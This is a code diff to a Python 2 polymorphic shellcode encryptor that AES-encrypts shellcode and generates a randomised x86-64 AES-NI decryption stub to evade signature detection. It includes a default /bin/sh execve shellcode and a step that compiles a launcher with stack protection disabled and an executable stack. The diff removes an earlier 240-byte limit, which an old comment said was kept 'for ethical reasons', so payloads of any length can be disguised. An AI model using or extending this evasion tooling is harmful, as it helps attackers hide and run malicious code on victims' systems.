@@ -7,7 +7,7 @@ from Crypto.Cipher import AES
 from random import randint
 from random import shuffle
 from sys import argv
-from os import system as cmd
+from os import system
 from copy import copy
 
 def morphSig():
@@ -77,63 +77,21 @@ def prepare(ciphertext):
 		decrypt='\x66\x41\x0f\xef'+xmm[0][7]+'\x66\x41\x0f\x38\xde'+xmm[0][6]+'\x66\x41\x0f\x38\xde'+xmm[0][5]+'\x66\x41\x0f\x38\xde'+xmm[0][4]+'\x66\x41\x0f\x38\xde'+xmm[0][3]+'\x66\x41\x0f\x38\xde'+xmm[0][2]+'\x66\x41\x0f\x38\xde'+xmm[0][1]+'\x66\x41\x0f\x38\xde'+xmm[0][0]+'\x66\x0f\x38\xde'+xmm[0][7]+'\x66\x0f\x38\xde'+xmm[0][6]+'\x66\x0f\x38\xdf'+xmm[0][5]
 		if block == 0:
 #			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x89\x96\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
-##			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x99\x90\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
-			storage=''
-			oneStorage=['\x48','\xbe']
-			for byte in oneStorage:
-				storage+=byte
-			oneSub=[]
-			twoSub=[]
-			firstOffset=randint(1,255)
-			secondOffset=randint(1,255)
-			thirdOffset=randint(1,255)
-			fourthOffset=randint(1,255)
-			fifthOffset=randint(1,255)
-			sixOffset=randint(0x61,255)
-			sixthOffset=sixOffset-0x60
-			sevenOffset=randint(10,255)
-			seventhOffset=sevenOffset-9
-			eighthOffset=randint(1,255)
-# in order to obfuscate this constant, we will generate random numbers, the subtraction of which gives the addresse
-# and another huge number of possibilities here : (2^8-1)^6*(255-0x61)*(255-10) ~ 10^20 ~ 2^64
-			oneSub.append(str2hex(hex1str(eighthOffset)))
-			oneSub.append(str2hex(hex1str(sevenOffset)))
-			oneSub.append(str2hex(hex1str(sixOffset)))
-			oneSub.append(str2hex(hex1str(fifthOffset)))
-			oneSub.append(str2hex(hex1str(fourthOffset)))
-			oneSub.append(str2hex(hex1str(thirdOffset)))
-			oneSub.append(str2hex(hex1str(secondOffset)))
-			oneSub.append(str2hex(hex1str(firstOffset)))
-			twoSub.append(str2hex(hex1str(eighthOffset)))
-			twoSub.append(str2hex(hex1str(seventhOffset)))
-			twoSub.append(str2hex(hex1str(sixthOffset)))
-			twoSub.append(str2hex(hex1str(fifthOffset)))
-			twoSub.append(str2hex(hex1str(fourthOffset)))
-			twoSub.append(str2hex(hex1str(thirdOffset)))
-			twoSub.append(str2hex(hex1str(secondOffset)))
-			twoSub.append(str2hex(hex1str(firstOffset)))
-# it is necessary to reformat string and hex twice because, the format can be 0x1 whereas we need 0x01
-			for byte in oneSub:
-				storage+=byte
-			twoStorage=['\x48','\xb8']
-			for byte in twoStorage:
-				storage+=byte
-			for byte in twoSub:
-				storage+=byte
-			threeStorage=['\x48','\x29','\xc6','\x0f','\x29',movaps[0]]
-			for byte in threeStorage:
-				storage+=byte
-# the buffer will be not 0x600310, but 0x600900 because, gcc
+#			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x99\x90\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
+			storage='\x48\x89\xd6\x0f\x29'+movaps[0]
+# the buffer will be not 0x600310, but 0x600900 or 0x601280 because, GCC, anyway we can get it from RDX
 		else:
-			storage='\x0f\x29'+movapsNext[0]+str2hex(str(hex(0x10*block)))
-# that's why the length of the shellcode is limited to 16 bytes key + 15* 16 bytes block,so 0x10*15=240 bytes of shellcode, otherwise we will have null bytes and overflows, although it's not a technical limitation, I didn't implement such possibility because, most of the shellcodes are not such long for Linux and for ethical reasons :)
+			storage='\x48\x83\xc2\x10\x0f\x29'+movapsNext[0]
+# thus, the shellcode's length is arbitrary
 		decryption+=oneHalfCiphertext+twoHalfCiphertext+preparation+decrypt+storage
 	return decryption
 
 movq14=['\xc6','\xce','\xd6','\xde','\xe6','\xee','\xf6','\xfe']
 movq15=['\xc7','\xcf','\xd7','\xdf','\xe7','\xef','\xf7','\xff']
 movaps=['\x06','\x0e','\x16','\x1e','\x26','\x2e','\x36','\x3e']
-movapsNext=['\x46','\x4e','\x56','\x5e','\x66','\x6e','\x76','\x7e']
+#movapsNext=['\x46','\x4e','\x56','\x5e','\x66','\x6e','\x76','\x7e']
+#movapsNext=['\x03','\x0b','\x13','\x1b','\x23','\x2b','\x33','\x3b']
+movapsNext=['\x02','\x0a','\x12','\x1a','\x22','\x2a','\x32','\x3a']
 xmm=[]
 opcode=0xc0
 for i in range(8):
@@ -219,6 +177,14 @@ input=raw_input('ENTER YOUR SHELLCODE (like \\x31\\xc0... or blank for a default
 if not input:
 	shellcode= '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 else:
+	if len(input)>4092:
+		print ""
+		input=raw_input("WARNING : SHELLCODE IS TOO LONG FOR THE BUFFER, SPECIFY A STORAGE FILE : ")
+		file=open(input,'r')
+		input=''
+		for line in file:
+			input+=line
+		file.close()
 	shellcode=str2hex(input) 
 print ''
 print "SHELLCODE TO MORPH : "+hex2str(shellcode)
@@ -233,11 +199,11 @@ shellcode=pad(shellcode)
 # AES is a block cipher, it operates blocks of a fixed size (16 bytes in our case), so we need to make the code modulo the block size, in order it could be encrypted
 print ''
 print "PADDED CODE : "+hex2str(shellcode)
-if len(hex2str(shellcode)) > (240*2*2):
+#if len(hex2str(shellcode)) > (240*2*2):
 # x2 because of "\x" and another x2 bacause, opcode representation
-	print ''
-	print 'SHELLCODE TOO LONG, MAX 240 BYTES'
-	exit(1)
+#	print ''
+#	print 'SHELLCODE TOO LONG, MAX 240 BYTES'
+#	exit(1)
 cipher = AES.AESCipher(key, AES.MODE_ECB)
 # ECB mode is the simplest and the fastest, it has a huge security lack though, but not for our purpose, so we have already 2^128 possibilities
 
@@ -288,7 +254,7 @@ if not input :
 	file.write("unsigned char shellcode[]=\""+hex2str(shellcode)+"\";")
 	file.write("main(){int (*ret)()=(int(*)()) shellcode; ret();}")
 	file.close()
-	cmd("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode && rm shellcode.c")
+	system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode && rm shellcode.c")
 # stack protector is mandatory in some cases
 	print ''
 	print 'READY TO LAUNCH : ./shellcode'
